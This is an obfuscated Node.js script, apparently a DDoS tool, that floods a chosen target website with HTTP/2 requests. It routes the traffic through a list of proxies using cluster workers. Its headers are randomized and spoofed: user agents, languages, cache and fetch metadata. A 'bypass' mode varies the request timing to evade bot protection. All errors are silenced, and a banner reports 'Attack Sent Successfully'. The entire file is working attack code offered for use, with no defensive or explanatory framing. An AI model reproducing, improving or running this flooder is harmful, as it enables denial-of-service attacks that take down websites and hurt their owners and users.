const net=require('net');
const http2=require('http2');
const tls=require('tls');
const cluster=require('cluster');
const url=require('url');
const crypto=require('crypto');
const fs=require('fs');
const colors=require('colors');
const pidusage=require('pidusage');
const{fork}=require('child_process');
const randomUseragent=require('random-useragent');
const defaultCiphers=crypto.constants.defaultCoreCipherList.split(':');
const ciphers='GREASE:'+[defaultCiphers[2],defaultCiphers[1],defaultCiphers[0],...defaultCiphers.slice(3)].join(':');
function getRandomTLSCiphersuite(){
	const _0x50f0bb=['TLS_AES_128_CCM_8_SHA256','TLS_AES_128_CCM_SHA256','TLS_AES_256_GCM_SHA384','TLS_AES_128_GCM_SHA256'];
	const _0x10c5b8=_0x50f0bb[Math.floor(Math.random()*_0x50f0bb.length)];
	return _0x10c5b8;
}
const randomTLSCiphersuite=getRandomTLSCiphersuite();
const accept_header=['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'],cache_header=['max-age=0','no-cache','no-store','pre-check=0','post-check=0','must-revalidate','proxy-revalidate','s-maxage=604800','no-cache, no-store,private, max-age=0, must-revalidate','no-cache, no-store,private, s-maxage=604800, must-revalidate','no-cache, no-store,private, max-age=604800, must-revalidate'];
const language_header=['he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7','fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5','en-US,en;q=0.5','en-US,en;q=0.9','de-CH;q=0.7','da, en-gb;q=0.8, en;q=0.7','cs;q=0.5','nl-NL,nl;q=0.9','nn-NO,nn;q=0.9','or-IN,or;q=0.9','pa-IN,pa;q=0.9','pl-PL,pl;q=0.9','pt-BR,pt;q=0.9','pt-PT,pt;q=0.9','ro-RO,ro;q=0.9','ru-RU,ru;q=0.9','si-LK,si;q=0.9','sk-SK,sk;q=0.9','sl-SI,sl;q=0.9','sq-AL,sq;q=0.9','sr-Cyrl-RS,sr;q=0.9','sr-Latn-RS,sr;q=0.9','sv-SE,sv;q=0.9','sw-KE,sw;q=0.9','ta-IN,ta;q=0.9','te-IN,te;q=0.9','th-TH,th;q=0.9','tr-TR,tr;q=0.9','uk-UA,uk;q=0.9','ur-PK,ur;q=0.9','uz-Latn-UZ,uz;q=0.9','vi-VN,vi;q=0.9','zh-CN,zh;q=0.9','zh-HK,zh;q=0.9','zh-TW,zh;q=0.9','am-ET,am;q=0.8','as-IN,as;q=0.8','az-Cyrl-AZ,az;q=0.8','bn-BD,bn;q=0.8','bs-Cyrl-BA,bs;q=0.8','bs-Latn-BA,bs;q=0.8','dz-BT,dz;q=0.8','fil-PH,fil;q=0.8','fr-CA,fr;q=0.8','fr-CH,fr;q=0.8','fr-BE,fr;q=0.8','fr-LU,fr;q=0.8','gsw-CH,gsw;q=0.8','ha-Latn-NG,ha;q=0.8','hr-BA,hr;q=0.8','ig-NG,ig;q=0.8','ii-CN,ii;q=0.8','is-IS,is;q=0.8','jv-Latn-ID,jv;q=0.8','ka-GE,ka;q=0.8','kkj-CM,kkj;q=0.8','kl-GL,kl;q=0.8','km-KH,km;q=0.8','kok-IN,kok;q=0.8','ks-Arab-IN,ks;q=0.8','lb-LU,lb;q=0.8','ln-CG,ln;q=0.8','mn-Mong-CN,mn;q=0.8','mr-MN,mr;q=0.8','ms-BN,ms;q=0.8','mt-MT,mt;q=0.8','mua-CM,mua;q=0.8','nds-DE,nds;q=0.8','ne-IN,ne;q=0.8','nso-ZA,nso;q=0.8','oc-FR,oc;q=0.8','pa-Arab-PK,pa;q=0.8','ps-AF,ps;q=0.8','quz-BO,quz;q=0.8','quz-EC,quz;q=0.8','quz-PE,quz;q=0.8','rm-CH,rm;q=0.8','rw-RW,rw;q=0.8','sd-Arab-PK,sd;q=0.8','se-NO,se;q=0.8','si-LK,si;q=0.8','smn-FI,smn;q=0.8','sms-FI,sms;q=0.8','syr-SY,syr;q=0.8','tg-Cyrl-TJ,tg;q=0.8','ti-ER,ti;q=0.8','tk-TM,tk;q=0.8','tn-ZA,tn;q=0.8','tt-RU,tt;q=0.8','ug-CN,ug;q=0.8','uz-Cyrl-UZ,uz;q=0.8','ve-ZA,ve;q=0.8','wo-SN,wo;q=0.8','xh-ZA,xh;q=0.8','yo-NG,yo;q=0.8','zgh-MA,zgh;q=0.8','zu-ZA,zu;q=0.8'];
const fetch_site=['same-origin','same-site','cross-site','none'];
const fetch_mode=['navigate','same-origin','no-cors','cors'];
const fetch_dest=['document','sharedworker','subresource','unknown','worker'];
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners=0;
const sigalgs=['ecdsa_secp256r1_sha256','ecdsa_secp384r1_sha384','ecdsa_secp521r1_sha512','rsa_pss_rsae_sha256','rsa_pss_rsae_sha384','rsa_pss_rsae_sha512','rsa_pkcs1_sha256','rsa_pkcs1_sha384','rsa_pkcs1_sha512'];
let SignalsList=sigalgs.join(':');
const ecdhCurve='GREASE:X25519:x25519:P-256:P-384:P-521:X448';
const secureOptions=crypto.constants.SSL_OP_NO_SSLv2|crypto.constants.SSL_OP_NO_SSLv3|crypto.constants.SSL_OP_NO_TLSv1|crypto.constants.SSL_OP_NO_TLSv1_1|crypto.constants.SSL_OP_NO_TLSv1_3|crypto.constants.ALPN_ENABLED|crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION|crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE|crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT|crypto.constants.SSL_OP_COOKIE_EXCHANGE|crypto.constants.SSL_OP_PKCS1_CHECK_1|crypto.constants.SSL_OP_PKCS1_CHECK_2|crypto.constants.SSL_OP_SINGLE_DH_USE|crypto.constants.SSL_OP_SINGLE_ECDH_USE|crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
if(process.argv.length<7){
	console.log('...');
	process.exit();
}
const secureProtocol='TLS_method';
const headers={};
const secureContextOptions={'ciphers':ciphers,'sigalgs':SignalsList,'honorCipherOrder':true,'secureOptions':secureOptions,'secureProtocol':secureProtocol};
const secureContext=tls.createSecureContext(secureContextOptions);
const args={'target':process.argv[2],'time':~~process.argv[3],'Rate':~~process.argv[4],'threads':~~process.argv[5],'proxyFile':process.argv[6],'input':process.argv[7]};
var proxies=readLines(args.proxyFile);
const parsedTarget=url.parse(args.target);
if(cluster.isMaster){
	for(let counter=1;counter<=args.threads;counter++){
		console.clear();
		console.log('Attack Sent Successfully - xNeonn'.blue);
		setTimeout(()=>{
			process.stdout.write('\rLoading: 100%\n'.blue);
		},process.argv[3]*1000);
		cluster.fork();
	}
}else{
	for(let i=0;i<args.Rate;i++){
		setInterval(runFlooder,randomIntn(10,100));
	}
}
class NetSocket{
	constructor(){}
	['HTTP'](_0x197e5a,_0x224fff){
		const _0x45fcd8=_0x197e5a.address.split(':');
		const _0x399052=_0x45fcd8[0];
		const _0x488b77='CONNECT '+_0x197e5a.address+':443 HTTP/1.1\r\nHost: '+_0x197e5a.address+':443\r\nConnection: Keep-Alive\r\n\r\n';
		const _0x3ffd79=new Buffer[('from')](_0x488b77);
		const _0x37929c=net.connect({'host':_0x197e5a.host,'port':_0x197e5a.port,'allowHalfOpen':true,'writable':true,'readable':true});
		_0x37929c.setTimeout(_0x197e5a.timeout*600000);
		_0x37929c.setKeepAlive(true,600000);
		_0x37929c.setNoDelay(true);
		_0x37929c.on('connect',()=>{
			_0x37929c.write(_0x3ffd79);
		});
		_0x37929c.on('data',_0x303901=>{
			const _0x5327cc=_0x303901.toString('utf-8');
			const _0xd48cf4=_0x5327cc.includes('HTTP/1.1 200');
			if(_0xd48cf4===false){
				_0x37929c.destroy();
				return _0x224fff(undefined,'error: invalid response from proxy server');
			}
			return _0x224fff(_0x37929c,undefined);
		});
		_0x37929c.on('timeout',()=>{
			_0x37929c.destroy();
			return _0x224fff(undefined,'error: timeout exceeded');
		});
	}
}
function getRandomInt(_0x40ae9e,_0x3c7b06){
	return Math.floor(Math.random()*(_0x3c7b06-_0x40ae9e+1))+_0x40ae9e;
}
const jalist=['002205d0f96c37c5e660b9f041363c1','073eede15b2a5a0302d823ecbd5ad15b','0b61c673ee71fe9ee725bd687c455809','6cd1b944f5885e2cfbe98a840b75eeb8','94c485bca29d5392be53f2b8cf7f4304','b4f4e6164f938870486578536fc1ffce','b8f81673c0e1d29908346f3bab892b9b','baaac9b6bf25ad098115c71c59d29e51','bc6c386f480ee97b9d9e52d472b772d8','da949afd9bd6df820730f8f171584a71','f58966d34ff9488a83797b55c804724d','fd6314b03413399e4f23d1524d206692','0a81538cf247c104edb677bdb8902ed5','0b6592fd91d4843c823b75e49b43838d','0ffee3ba8e615ad22535e7f771690a28','1c15aca4a38bad90f9c40678f6aface9','5163bc7c08f57077bc652ec370459c2f','a88f1426c4603f2a8cd8bb41e875cb75','b03910cc6de801d2fcfa0c3b9f397df4','bfcc1a3891601edb4f137ab7ab25b840','ce694315cbb81ce95e6ae4ae8cbafde6','f15797a734d0b4f171a86fd35c9a5e43'];
var operatingSystems=['Windows NT 10.0','Macintosh','X11'];
var architectures={'Windows NT 10.0':''+(Math.random()<0.5?'Win64; x64; rv:10'+randstra(1)+'.0':'Win64; x64; rv:10'+randstra(3)+'.0'),'Windows NT 11.0':''+(Math.random()<0.5?'WOW64; Trident/'+randstra(2)+'.'+randstra(1)+'; rv:10'+randstra(1)+'.0':'Win64; x64; rv:10'+randstra(2)+'.0'),'Macintosh':'Intel Mac OS X 1'+randstra(1)+'_'+randstra(1)+'_'+randstra(1),'X11':''+(Math.random()<0.5?'Linux x86_64; rv:10'+randstra(1)+'.0':'Linux x86_64; rv:10'+randstra(3)+'.0')};
var browserss=['Firefox/117.0','Firefox/116.0','Firefox/115.0','Firefox/114.0','Firefox/113.0','Firefox/112.0','Firefox/111.0','Firefox/110.0'];
var browsers=['Chrome/116.0.0.0 Safari/537.36 Edg/116','Chrome/115.0.0.0 Safari/537.36 Edg/115','Chrome/114.0.0.0 Safari/537.36 Edg/114','Chrome/113.0.0.0 Safari/537.36 Edg/113','Chrome/112.0.0.0 Safari/537.36 Edg/112','Chrome/111.0.0.0 Safari/537.36 Edg/111','Chrome/110.0.0.0 Safari/537.36 Edg/110','Chrome/116.0.0.0 Safari/537.36 Vivaldi/116','Chrome/115.0.0.0 Safari/537.36 Vivaldi/115','Chrome/114.0.0.0 Safari/537.36 Vivaldi/114','Chrome/113.0.0.0 Safari/537.36 Vivaldi/113','Chrome/112.0.0.0 Safari/537.36 Vivaldi/112','Chrome/111.0.0.0 Safari/537.36 Vivaldi/111','Chrome/110.0.0.0 Safari/537.36 Vivaldi/110','Chrome/116.0.0.0 Safari/537.36 OPR/102','Chrome/100.0.4896.127 Safari/537.36'];
function getRandomValue(_0x1fe5d0){
	const _0x329d9a=Math.floor(Math.random()*_0x1fe5d0.length);
	return _0x1fe5d0[_0x329d9a];
}
function randstra(_0x10cedf){
	const _0x4f2daa='0123456789';
	let _0x2306ec='';
	const _0x105623=_0x4f2daa.length;
	for(let _0x439d67=0;_0x439d67<_0x10cedf;_0x439d67++){
		_0x2306ec+=_0x4f2daa.charAt(Math.floor(Math.random()*_0x105623));
	}
	return _0x2306ec;
}
const sec12={'Chrome/116.0.0.0 Safari/537.36 Edg/115.0.1901.203':'"Microsoft Edge";v="116"','Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0':'"Opera GX";v="100"','Chrome/116.0.0.0 Safari/537.36':'"Google Chrome";v="116"','Version/16.5 Safari/605.1.15':'"Safari";v="15.0.0", "Chrome";v="116"'};
const randomOS=getRandomValue(operatingSystems);
const randomArch=architectures[randomOS];
const randomBrowser=getRandomValue(browsers);
const brand=sec12[randomBrowser];
const randomsBrowser=getRandomValue(browserss);
const secua='"Chromium";v="116", "Not)A;Brand";v="24", '+brand;
var uas='Mozilla/5.0 ('+randomOS+'; '+randstrs(8)+' '+randomArch+') '+randstrs(6)+' AppleWebKit/537.36 '+randstra(7)+' (KHTML, like Gecko) '+randomBrowser;
const Socker=new NetSocket();
function readLines(_0x969f61){
	return fs.readFileSync(_0x969f61,'utf-8').toString().split(/\r?\n/);
}
function randomIntn(_0x3f9e49,_0x2323b2){
	return Math.floor(Math.random()*(_0x2323b2-_0x3f9e49)+_0x3f9e49);
}
function randomElement(_0x20ac88){
	return _0x20ac88[randomIntn(0,_0x20ac88.length)];
}
function randstrs(_0x4ec0c6){
	const _0x235c6b='0123456789';
	const _0x5a8ea6=_0x235c6b.length;
	const _0x33e15f=crypto.randomBytes(_0x4ec0c6);
	let _0x219022='';
	for(let _0x421197=0;_0x421197<_0x4ec0c6;_0x421197++){
		const _0x103d3e=_0x33e15f[_0x421197]%_0x5a8ea6;
		_0x219022+=_0x235c6b.charAt(_0x103d3e);
	}
	return _0x219022;
}
const randstrsValue=randstrs(10);
function runFlooder(){
	const _0x2d4e8c=randomElement(proxies);
	const _0x53effd=_0x2d4e8c.split(':');
	const _0x288768=parsedTarget.protocol=='https:'?'443':'80';
	let _0x718dcd;
	if(args.input==='flood'){
		_0x718dcd=1000;
	}else if(args.input==='bypass'){
		function _0x3848df(_0x135596,_0x531e0c){
			return Math.floor(Math.random()*(_0x531e0c-_0x135596+1))+_0x135596;
		}
		_0x718dcd=_0x3848df(1000,7000);
	}else{
		process.stdout.write('default : flood\r');
		_0x718dcd=1000;
	}
	const _0x5014f6=['text/plain','text/html','application/json','application/xml','multipart/form-data','application/octet-stream','image/jpeg','image/png','audio/mpeg','video/mp4','application/javascript','application/pdf','application/vnd.ms-excel','application/vnd.ms-powerpoint','application/vnd.openxmlformats-officedocument.spreadsheetml.sheet','application/vnd.openxmlformats-officedocument.presentationml.presentation','application/vnd.openxmlformats-officedocument.wordprocessingml.document','application/zip','image/gif','image/bmp','image/tiff','audio/wav','audio/midi','video/avi','video/mpeg','video/quicktime','text/csv','text/xml','text/css','text/javascript','application/graphql','application/x-www-form-urlencoded','application/vnd.api+json','application/ld+json','application/x-pkcs12','application/x-pkcs7-certificates','application/x-pkcs7-certreqresp','application/x-pem-file','application/x-x509-ca-cert','application/x-x509-user-cert','application/x-x509-server-cert','application/x-bzip','application/x-gzip','application/x-7z-compressed','application/x-rar-compressed','application/x-shockwave-flash'];
	encoding_header=['gzip, deflate, br','compress, gzip','deflate, gzip','gzip, identity'];
	function _0x15cde6(_0x508d6b){
		const _0x3098ee='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-';
		let _0x233206='';
		const _0x336760=_0x3098ee.length;
		for(let _0x422782=0;_0x422782<_0x508d6b;_0x422782++){
			_0x233206+=_0x3098ee.charAt(Math.floor(Math.random()*_0x336760));
		}
		return _0x233206;
	}
	function _0x2b965f(_0x374d0a){
		const _0x4a3643='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
		let _0x2a0c0a='';
		const _0x39cf96=_0x4a3643.length;
		for(let _0x597ac7=0;_0x597ac7<_0x374d0a;_0x597ac7++){
			_0x2a0c0a+=_0x4a3643.charAt(Math.floor(Math.random()*_0x39cf96));
		}
		return _0x2a0c0a;
	}
	function _0x35ba27(_0x8f38f2,_0x365e12){
		const _0x4f60ee='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
		const _0x3b9497=Math.floor(Math.random()*(_0x365e12-_0x8f38f2+1))+_0x8f38f2;
		const _0x1b918c=Array.from({'length':_0x3b9497},()=>{
			const _0x582b5b=Math.floor(Math.random()*_0x4f60ee.length);
			return _0x4f60ee[_0x582b5b];
		});
		return _0x1b918c.join('');
	}
	const _0x136eea=[{'dnt':'1'},{'te':'trailers'},{'origin':'https://'+parsedTarget.host},{'referer':'https://'+parsedTarget.host+'/'},{'source-ip':_0x2b965f(5)},{'viewport-width':'1920'},{'device-memory':'0.25'}];
	const _0x46f839=[{'dnt':'1'},{'origin':'https://'+parsedTarget.host},{'referer':'https://'+parsedTarget.host+'/'},{'cookie':_0x2b965f(5)+'='+_0x2b965f(5)},,{'viewport-width':'1920'},{'device-memory':'0.25'}];
	let _0x29bb8c={':authority':parsedTarget.host,':method':'GET','accept-encoding':encoding_header[Math.floor(Math.random()*encoding_header.length)],'Accept':accept_header[Math.floor(Math.random()*accept_header.length)],':path':parsedTarget.path,':scheme':'https','content-type':_0x5014f6[Math.floor(Math.random()*_0x5014f6.length)],'cache-control':cache_header[Math.floor(Math.random()*cache_header.length)],'sec-fetch-dest':fetch_dest[Math.floor(Math.random()*fetch_dest.length)],'sec-fetch-mode':fetch_mode[Math.floor(Math.random()*fetch_mode.length)],'sec-fetch-site':fetch_site[Math.floor(Math.random()*fetch_site.length)],'user-agent':uas};
	const _0x43cc57={'host':_0x53effd[0],'port':~~_0x53effd[1],'address':parsedTarget.host+':443','x-forwarded-for':_0x53effd[0],'timeout':15};
	Socker.HTTP(_0x43cc57,(_0x220f6e,_0xdee71a)=>{
		if(_0xdee71a)return;
		_0x220f6e.setKeepAlive(true,600000);
		_0x220f6e.setNoDelay(true);
		const _0x16dddd={'enablePush':false,'initialWindowSize':15564991};
		tls.DEFAULT_MAX_VERSION='TLSv1.3';
		const _0x18e46f={'port':_0x288768,'secure':true,'ALPNProtocols':['h2','http/1.1','spdy/3.1'],'ciphers':ciphers,'sigalgs':sigalgs,'requestCert':true,'socket':_0x220f6e,'ecdhCurve':ecdhCurve,'honorCipherOrder':false,'rejectUnauthorized':false,'secureOptions':secureOptions,'secureContext':secureContext,'host':parsedTarget.host,'servername':parsedTarget.host,'secureProtocol':secureProtocol};
		const _0x3b0424=tls.connect(_0x288768,parsedTarget.host,_0x18e46f);
		_0x3b0424.allowHalfOpen=true;
		_0x3b0424.setNoDelay(true);
		_0x3b0424.setKeepAlive(true,600000);
		_0x3b0424.setMaxListeners(0);
		const _0x7ceba0=http2.connect(parsedTarget.href,{'settings':{'initialWindowSize':15564991,'maxFrameSize':236619},'createConnection':()=>_0x3b0424,'socket':_0x220f6e});
		_0x7ceba0.settings({'initialWindowSize':15564991,'maxFrameSize':236619});
		_0x7ceba0.setMaxListeners(0);
		_0x7ceba0.settings(_0x16dddd);
		_0x7ceba0.on('connect',()=>{
			const _0x558f7a=setInterval(()=>{
				for(let _0x3b7679=0;_0x3b7679<args.Rate;_0x3b7679++){
					const _0x4405af={
						..._0x29bb8c,..._0x136eea[Math.floor(Math.random()*_0x136eea.length)],..._0x46f839[Math.floor(Math.random()*_0x136eea.length)]
					};
					const _0x46f9f3=_0x7ceba0.request(_0x4405af).on('response',_0x1f786e=>{
						_0x46f9f3.close();
						_0x46f9f3.destroy();
						return;
					});
					_0x46f9f3.end();
				}
			},_0x718dcd);
			return;
		});
		_0x7ceba0.on('close',()=>{
			_0x7ceba0.destroy();
			_0x3b0424.destroy();
			_0x220f6e.destroy();
			return;
		});
		_0x7ceba0.on('timeout',()=>{
			_0x7ceba0.destroy();
			_0x220f6e.destroy();
			return;
		});
		_0x7ceba0.on('error',_0xdee71a=>{
			_0x7ceba0.destroy();
			_0x3b0424.destroy();
			_0x220f6e.destroy();
			return;
		});
	});
}
const StopScript=()=>process.exit(1);
setTimeout(StopScript,args.time*1000);
process.on('uncaughtException',_0x3952c8=>{});
process.on('unhandledRejection',_0x29cf71=>{});
